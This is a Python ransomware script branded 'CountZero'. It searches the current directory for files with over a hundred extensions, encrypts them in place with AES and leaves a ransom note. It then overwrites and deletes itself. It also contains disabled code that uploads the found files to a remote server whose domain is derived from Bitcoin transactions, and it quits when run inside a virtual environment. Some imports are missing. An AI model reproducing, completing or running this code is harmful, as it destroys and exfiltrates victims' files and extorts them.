import sys, os
import webbrowser
from pathlib import Path
from secrets import token_urlsafe
from bloxplorer import bitcoin_explorer
from Cryptodome.Cipher import AES
# ---------------------------------------------------------------------- #
# Runs on Virtual Env?:
# ---------------------------------------------------------------------- #
def get_prefix():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def runs_on_venv():
    return get_prefix() != sys.prefix

if True:
    if runs_on_venv():
        sys.exit()

# ---------------------------------------------------------------------- #
# Check arguments:
# ---------------------------------------------------------------------- #
if len(sys.argv) != 2:
    print("You need to pass one encryption key.")
    sys.exit()
else:
    key = sys.argv[1].encode("utf8")

# ---------------------------------------------------------------------- #
# Try to initialize on home:
# ---------------------------------------------------------------------- #
if False:
    try:
        os.chdir(str(Path.home()))
    except Exception as error:
        print(error)

# ---------------------------------------------------------------------- #
# Define targets::
# ---------------------------------------------------------------------- #
class Tool:
    def __init__(self):
        self.files_found = []
        self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg", "exe",
                        "epub", "mp3", "gif", "doc", "odp", "ods", "json", "rs",
                        "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp", "jar",
                        "rb", "java", "pl", "py", "apk", "raw", "eml", "msg", "tmp",
                        "conf", "config", "yaml", "asm", "h", "r", "m", "luac", "dat",
                        "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
                        "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
                        "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala", "mkv",
                        "odl", "rar", "bak", "bkp", "iso", "zip", "7z", "sbf", "old", "meta",
                        "psw", "bkf", "fbk", "xar", "moz-backup", "orig", "new", "001", "bps",
                        "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
                        "in1", "och", "exclude", "data", "$$$", "000", "bac", "arc", "assets",
                        "resource", "resS", "info", "dll", "vdx", "cache", "csv"]
        self.new_server_address = "BTC Address" # For updates

tool = Tool()

# ---------------------------------------------------------------------- #
# Server Setup:
# ---------------------------------------------------------------------- #
post_server = "http://127.0.0.1/file_form.php"
# Prepare Server Update:
def server_update():
    tx_id = 0
    try:
        while True:
            history = bitcoin_explorer.addr.get_tx_history(tool.new_server_address)
            last_tx = history.data[tx_id]
            last_value = dict(last_tx['vout'][0])['value']
            if last_value >= 10000000:
                break
            else:
                tx_id += 1
                continue
        last_domain = hashlib.md5(str(last_value).encode()).hexdigest()[8:24]
        return "http://{0}.com/file_form.php".format(last_domain)
    except Exception as error:
        print(error)

# ---------------------------------------------------------------------- #
# Search files:
# ---------------------------------------------------------------------- #
for dirpath, dirs, files in os.walk(os.getcwd()):
    for f in files:
        path = os.path.abspath(os.path.join(dirpath, f))
        f_extension = path.split('.')[-1]
        if f_extension in tool.targets:
            tool.files_found.append(path)

# ---------------------------------------------------------------------- #
# Ping seerver & Upload:
# ---------------------------------------------------------------------- #
if False:
    while True:
        ping = os.system("ping -c 1 " + post_server[:-14])
        if ping == 0:
            break
        else:
            try:
                post_server = server_update()
            except Exception as error:
                sleep(300)
                continue
# Upload:
if False:
    # Send files
    for f in tool.files_found:
        tmp_data = open(f, "rb")
        try:
            tmp_response = requests.post(post_server, files = {"fileToUpload": tmp_data})
            tmp_data.close()
        except Exception as error:
            print(error)
        sleep(0.1)

# ---------------------------------------------------------------------- #
# Encrypt:
# ---------------------------------------------------------------------- #
def encrypt(filename, key):
    try:
        # Open file:
        data = open(filename, "rb")
        # Encrypt:
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.read())
        # Once encrypted, close data:
        data.close()
        # Reopen file to overwrite:
        output = open(filename, "wb")
        [output.write(x) for x in (cipher.nonce, tag, ciphertext)]
        # Close file:
        output.close()
    except Exception as error:
        print(error)

# ---------------------------------------------------------------------- #
# Find & Encrypt:
# ---------------------------------------------------------------------- #
for f in tool.files_found:
    try:
        encrypt(f, sys.argv[1])
    except Exception as error:
        print(error)

# ---------------------------------------------------------------------- #
# Create message:
# ---------------------------------------------------------------------- #
message = """_________                      __    __________
\_   ___ \  ____  __ __  _____/  |_  \____    /___________  ____
/    \  \/ /  _ \|  |  \/    \   __\   /     // __ \_  __ \/  _ \
\     \___(  <_> )  |  /   |  \  |    /     /\  ___/|  | \(  <_> )
 \______  /\____/|____/|___|  /__|   /_______ \___  >__|   \____/
        \/                  \/               \/   \/

Hello. :)
{0} files were encrypted.

[Enter your instructions here.]
""".format(len(tool.files_found))
# Leave message:
with open("CountZero.README.txt", "w") as fl:
    fl.write(message)

# ---------------------------------------------------------------------- #
# Open message file and vanish:
# ---------------------------------------------------------------------- #
# Open file:
webbrowser.open("file://{0}/CountZero.README.txt".format(os.getcwd()), new=2)
# Vanish:
try:
    for i in range(10):
        tmp = open(sys.argv[0], "w")
        tmp.write(token_urlsafe(8))
        tmp.close()
    new_name = token_urlsafe(16)
    os.rename(sys.argv[0], new_name)
    os.unlink(new_name)
except Exception as error:
    print(error)
